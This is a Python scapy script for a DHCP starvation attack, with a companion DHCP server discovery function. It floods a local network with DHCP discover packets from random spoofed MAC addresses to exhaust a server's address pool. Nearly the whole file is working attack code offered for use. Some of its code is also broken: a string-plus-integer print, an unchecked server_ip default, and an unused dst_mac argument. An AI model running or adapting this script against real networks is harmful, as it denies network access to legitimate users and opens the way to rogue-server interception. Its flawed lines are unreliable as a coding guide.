#!/usr/bin/env python3
# python dhcp_starvation.py -i Ethernet -dhcpdiscover
# python dhcp_starvation.py -i Ethernet -reps 255 -server_ip 192.168.1.1

import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def dhcpdiscover(iface,
                 timeout = 0.1,
                 debug = 0):

    conf.iface = iface
    _, hw = get_if_raw_hwaddr(conf.iface)
    
    dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=hw) / DHCP(options=[("message-type","discover"), "end"])

    print("Sending DHCP discover on ", conf.iface)
    print("Waiting", timeout, "seconds for reply")

    ans, unans = srp(dhcp_discover, multi=True, timeout = timeout, verbose=0)
    servers = {}

    #check for dhcp offer
    for snd, rcv in ans:
        is_offer = False
        for opt in rcv.payload.payload.payload.payload.options:
            if opt[0] == 'message-type':
                if opt[1] == 2:
                    is_offer = True
                
        if not is_offer:
            continue

        if not rcv.src in servers:
            servers[rcv.src] = {'MAC': rcv.src, 'IP': rcv.payload.src, 'offer': rcv.payload.payload.payload.yiaddr, 'options': rcv.payload.payload.payload.payload.options}

    print('')
    print(len(ans), "replies from", len(servers), "(based on MAC address) DHCP server(s)")
    print('')
    
    if len(servers) > 1:
        print("WARNING: Looks like there might be more than one DHCP server on your network")
        print('')
        
    for mac in servers:
        server = servers[mac]
        print("DHCP server", mac)
        print("  Server IP:", server['IP'])
        print("  Offer IP:", server['offer'])
        print("  Options:")
        for opt in server['options']:
            if opt[0] == 'message-type':
                print('    message-type:', DHCPTypes[opt[1]])
            else:
                print('    ' + str(opt[0])+':', opt[1])
        print('')
        
def starveit(server_ip="",
            dst_mac="ff:ff:ff:ff:ff:ff",
            timeout=0.2,
            repetition=10,
            debug=0):
    
    for i in range(repetition):
        fakeMAC = str(RandMAC())
        
        dhcp_options=[("message-type","discover"),"end"]
        
        if server_ip != "":
            dhcp_options.insert(1, ("server_ip",server_ip))

        dhcp_discover = Ether(src=fakeMAC, dst='ff:ff:ff:ff:ff:ff',  type=0x0800)\
                        / IP(src='0.0.0.0', dst='255.255.255.255')\
                        / UDP(dport=67,sport=68)\
                        / BOOTP(op=1, chaddr=fakeMAC)\
                        / DHCP(options=dhcp_options)

        sendp(dhcp_discover, verbose=0)
        print("Sent " + repetition + " packet(s)")
        
    if debug: dhcp_discover.show()
    time.sleep(timeout)


if __name__=="__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', metavar='INTERFACE_NAME', required=True, 
                        help="local network interface")

    parser.add_argument('-dhcpdiscover', action='store_true', required=False,
                        help="Discover dhcp servers on current network")

    parser.add_argument('-reps',
                        metavar='INT',
                        type=int, 
                        default=3,
                        help="No of repetitions, sometime packet get lost(10)")

    parser.add_argument('-server_ip', required=False, 
                        help="DHCP server ip, eg: 192.168.27.254")

    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                        help="Destination DHCP MAC address (ff:ff:ff:ff:ff:ff)")

    parser.add_argument('-timeout', type=float, default=0.1, required=False, 
                        help="seconds to wait between a request and another(0.1)")

    parser.add_argument('-debug', action='store_true', required=False,
                        help="print packets")

    conf.checkIPaddr = False
    args = parser.parse_args()
    conf.iface = args.i

    if args.dhcpdiscover:
        dhcpdiscover(conf.iface,
                     timeout = args.timeout, 
                     debug = args.debug)
    else:
        starveit(server_ip = args.server_ip,
            dst_mac = args.dst_mac,
            timeout = args.timeout,
            repetition = args.reps,
            debug = args.debug)
